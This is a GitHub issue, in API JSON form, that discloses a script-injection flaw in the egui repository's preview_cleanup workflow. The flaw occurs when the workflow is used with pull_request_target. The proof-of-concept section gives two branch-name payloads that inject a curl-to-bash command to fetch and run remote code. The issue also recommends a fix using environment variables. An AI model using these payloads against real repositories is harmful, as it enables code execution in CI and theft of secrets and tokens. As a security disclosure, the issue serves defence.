{"url":"https://api.github.com/repos/emilk/egui/issues/5458","repository_url":"https://api.github.com/repos/emilk/egui","labels_url":"https://api.github.com/repos/emilk/egui/issues/5458/labels{/name}","comments_url":"https://api.github.com/repos/emilk/egui/issues/5458/comments","events_url":"https://api.github.com/repos/emilk/egui/issues/5458/events","html_url":"https://github.com/emilk/egui/issues/5458","id":2730915321,"node_id":"I_kwDOCd2s286ixnX5","number":5458,"title":"GitHub Actions Script Injection in `egui`","user":{"login":"xu-xiang","id":12231426,"node_id":"MDQ6VXNlcjEyMjMxNDI2","avatar_url":"https://avatars.githubusercontent.com/u/12231426?v=4","gravatar_id":"","url":"https://api.github.com/users/xu-xiang","html_url":"https://github.com/xu-xiang","followers_url":"https://api.github.com/users/xu-xiang/followers","following_url":"https://api.github.com/users/xu-xiang/following{/other_user}","gists_url":"https://api.github.com/users/xu-xiang/gists{/gist_id}","starred_url":"https://api.github.com/users/xu-xiang/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/xu-xiang/subscriptions","organizations_url":"https://api.github.com/users/xu-xiang/orgs","repos_url":"https://api.github.com/users/xu-xiang/repos","events_url":"https://api.github.com/users/xu-xiang/events{/privacy}","received_events_url":"https://api.github.com/users/xu-xiang/received_events","type":"User","user_view_type":"public","site_admin":false},"labels":[{"id":1191600517,"node_id":"MDU6TGFiZWwxMTkxNjAwNTE3","url":"https://api.github.com/repos/emilk/egui/labels/bug","name":"bug","color":"FBCA04","default":true,"description":"Something is broken"}],"state":"closed","locked":false,"assignee":null,"assignees":[],"milestone":null,"comments":1,"created_at":"2024-12-10T18:44:18Z","updated_at":"2024-12-11T15:55:58Z","closed_at":"2024-12-11T15:55:58Z","author_association":"NONE","active_lock_reason":null,"sub_issues_summary":{"total":0,"completed":0,"percent_completed":0},"issue_dependencies_summary":{"blocked_by":0,"total_blocked_by":0,"blocking":0,"total_blocking":0},"body":"### Summary\r\nThe `egui` action available at https://github.com/emilk/egui/blob/f28080c67597615e829a4e0b7e6c4b80795892f2/.github/workflows/preview_cleanup.yml#L20 is vulnerable to GitHub Actions script injection. If anyone uses the action within a workflow that runs on the `pull_request_target` trigger, an attacker can inject arbitrary code into that workflow using a crafted branch name.\r\n\r\n### Details\r\nThe issue exists because `.github/workflows/preview_cleanup.yml` is a composite action and uses GitHub context expressions in a `run` step:\r\n\r\n```yaml\r\necho \"URL_SLUG=${{ github.event.pull_request.number }}-${{ github.event.pull_request.head.ref }}\" >> $GITHUB_ENV\r\n```\r\n\r\nIn this case, `github.event.pull_request.head.ref` is user-controlled and can be used to inject code.\r\n\r\n### PoC\r\nCreate a fork of any repository that uses `https://github.com/emilk/egui/` within a workflow that runs on `pull_request_target`.\r\n\r\nIn the fork, create a branch with an injection payload, e.g.:\r\n\r\n```bash\r\ntest\";{curl,-sSfL,gist.githubusercontent.com/.../file.sh}${IFS}|${IFS}bash\r\n```\r\n\r\nor\r\n\r\n```bash\r\n$({curl,-sSfL,raw.githubusercontent.com/.../file.sh}${IFS}|${IFS}bash)\r\n```\r\n\r\nCreate a draft pull request.\r\n\r\nIf the action is reachable, the attacker achieves arbitrary code execution.\r\n\r\n### Impact\r\nAny workflow using this action that runs on `pull_request_target` is vulnerable to arbitrary code execution within the context of the base branch. An attacker can use this to:\r\n1. **Permissions Risk**: If the workflow uses `permissions: contents: write`, the risk of repository compromise increases significantly.\r\n2. **Abuse the `GITHUB_TOKEN`**: This allows unauthorized changes to the repository.\r\n3. **Steal secrets**: Secrets used within the workflow can be exfiltrated.\r\n4. **Severe Consequences**: Similar vulnerabilities have led to severe incidents. For example, the **Ultralytics** repository was exploited to inject malicious code into their PyPI packages, infecting a wide user base with a cryptominer.  \r\n   **Reference:** [How the Hacker Attacked an Open-Source Project with 33K Stars](https://medium.com/@developerjo0517/how-the-hacker-attacked-open-source-project-that-has-33k-stars-on-github-c84338b639c7)\r\n\r\n\r\n### Fix\r\nSanitize user-controlled variables by passing them through environment variables.\r\n\r\n#### Recommended Fix\r\n\r\nUse environment variables to safely pass the `head.ref`:\r\n\r\n```yaml\r\nenv:\r\n  PR_HEAD_REF: ${{ github.event.pull_request.head.ref }}\r\nrun: |\r\n  echo \"github.event.pull_request.head.ref: $PR_HEAD_REF\"\r\n```\r\n\r\n**Reference:** [Ultralytics Fix Commit](https://github.com/ultralytics/actions/commit/8069e0ac4c23170f308ea6985783e64ca4a7900a#diff-1243c5424efaaa19bd8e813c5e6f6da46316e63761421b3e5f5c8ced9a36e6b6L61)\r\n\r\n#### Best Practices\r\n1. **Use `pull_request` Instead of `pull_request_target`**: If possible, avoid `pull_request_target` to limit the risk of code execution on the base branch.\r\n2. **Minimal Permissions**: Ensure the workflow's permissions are set to the minimum required.\r\n","closed_by":{"login":"lucasmerlin","id":8009393,"node_id":"MDQ6VXNlcjgwMDkzOTM=","avatar_url":"https://avatars.githubusercontent.com/u/8009393?v=4","gravatar_id":"","url":"https://api.github.com/users/lucasmerlin","html_url":"https://github.com/lucasmerlin","followers_url":"https://api.github.com/users/lucasmerlin/followers","following_url":"https://api.github.com/users/lucasmerlin/following{/other_user}","gists_url":"https://api.github.com/users/lucasmerlin/gists{/gist_id}","starred_url":"https://api.github.com/users/lucasmerlin/starred{/owner}{/repo}","subscriptions_url":"https://api.github.com/users/lucasmerlin/subscriptions","organizations_url":"https://api.github.com/users/lucasmerlin/orgs","repos_url":"https://api.github.com/users/lucasmerlin/repos","events_url":"https://api.github.com/users/lucasmerlin/events{/privacy}","received_events_url":"https://api.github.com/users/lucasmerlin/received_events","type":"User","user_view_type":"public","site_admin":false},"reactions":{"url":"https://api.github.com/repos/emilk/egui/issues/5458/reactions","total_count":0,"+1":0,"-1":0,"laugh":0,"hooray":0,"confused":0,"heart":0,"rocket":0,"eyes":0},"timeline_url":"https://api.github.com/repos/emilk/egui/issues/5458/timeline","performed_via_github_app":null,"state_reason":"completed"}